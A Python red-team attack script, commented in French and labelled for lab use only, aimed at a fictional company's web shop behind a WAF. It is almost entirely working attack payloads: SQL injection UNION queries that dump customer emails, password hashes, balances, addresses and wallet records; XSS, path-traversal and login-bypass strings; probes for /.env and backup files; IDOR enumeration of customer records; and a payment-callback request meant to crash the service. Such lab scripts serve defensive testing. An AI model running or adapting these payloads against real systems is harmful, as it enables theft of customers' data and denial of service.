"""Scénario d'attaque Red Team — LABORATOIRE UNIQUEMENT.
Usage : python attack.py --target http://192.168.137.1:8080
"""
import argparse

import httpx

SCAN_PAYLOADS = [
    "/products?id=1 UNION SELECT password_hash FROM customers",
    "/search?q=<script>alert(1)</script>",
    "/files?path=../../etc/passwd",
    "/login?user=admin' OR 1=1--",
]

DUMP_PAYLOADS = [
    "/products?id=1 UNION SELECT email, password_hash FROM customers",
    "/products?id=0 OR 1=1 UNION SELECT email, balance FROM customers",
    "/products?id=1 UNION SELECT phone, street, postal_code, city FROM customers",
    "/products?id=1 UNION SELECT amount, label FROM wallet_movements",
]

SENSITIVE_PATHS = [
    "/backup.sql",
    "/.env",
    "/shop/customers/export?format=csv",
    "/admin/wallets?all=true",
]

def scan(client: httpx.Client, target: str):
    print("== Étape 1 : scan de payloads ==")
    for path in SCAN_PAYLOADS:
        code = client.get(target + path).status_code
        print(f"  {code}  {path}")

def exfiltration(client: httpx.Client, target: str):
    print("== Étape 2 : tentatives de vol de données clients / cagnottes ==")
    for path in DUMP_PAYLOADS:
        code = client.get(target + path).status_code
        print(f"  dump     {code}  {path}")
    for path in SENSITIVE_PATHS:
        code = client.get(target + path).status_code
        print(f"  fichier  {code}  {path}")
    blocked = 0
    for customer_id in range(1, 21):
        code = client.get(f"{target}/shop/customers/{customer_id}").status_code
        if code >= 400:
            blocked += 1
    print(f"  idor     énumération /shop/customers/1..20 -> {blocked}/20 refusées (403/4xx)")

def exploit(client: httpx.Client, target: str):
    print("== Étape 3 : abus du callback de paiement ==")
    # Le service peut cesser de répondre à l'instant où il tombe : on attrape
    # le timeout / la coupure réseau, c'est l'effet recherché, pas une erreur.
    try:
        response = client.post(f"{target}/pay/callback", json={"status": "__CRASH__"}, timeout=3)
        print(f"  callback -> {response.status_code}")
    except httpx.HTTPError:
        print("  callback -> pas de réponse (le service tombe : effet recherché)")
    try:
        code = client.get(f"{target}/healthz", timeout=3).status_code
        print(f"  healthz après exploitation -> {code} (503/500 attendu : service dégradé)")
    except httpx.HTTPError:
        print("  healthz après exploitation -> injoignable (service hors service)")

def main():
    parser = argparse.ArgumentParser(description="Attaque de laboratoire contre le SI fictif du groupe")
    parser.add_argument("--target", default="http://127.0.0.1:8080", help="URL du WAF du groupe")
    args = parser.parse_args()

    print(f"Cible : {args.target}\n")
    with httpx.Client(timeout=5) as client:
        scan(client, args.target)
        exfiltration(client, args.target)
        exploit(client, args.target)

if __name__ == "__main__":
    main()